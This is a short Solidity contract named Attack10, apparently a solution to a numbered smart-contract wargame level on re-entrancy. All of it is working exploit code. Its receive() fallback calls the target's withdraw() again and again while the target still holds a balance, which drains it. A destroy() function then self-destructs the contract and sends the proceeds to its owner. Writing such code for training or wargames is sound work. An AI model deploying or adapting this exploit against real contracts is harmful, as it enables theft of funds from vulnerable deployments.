// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

// import "./10-re-entrancy.sol";
import "interfaces/ire-entrancy.sol";

contract Attack10 {
    ReentrantInterface reentrance;
    address payable public owner;
    uint public amount;

    constructor(address _reEntrancyAddress, uint _amount) public {
        reentrance = ReentrantInterface(_reEntrancyAddress);
        owner = msg.sender;
        amount = _amount;
    }

    function attack() public payable {
        reentrance.withdraw(amount);
    }

    function destroy() public {
        selfdestruct(owner);
    }

    receive() external payable {
        if (address(reentrance).balance > amount) {
            reentrance.withdraw(amount);
        }
    }
}
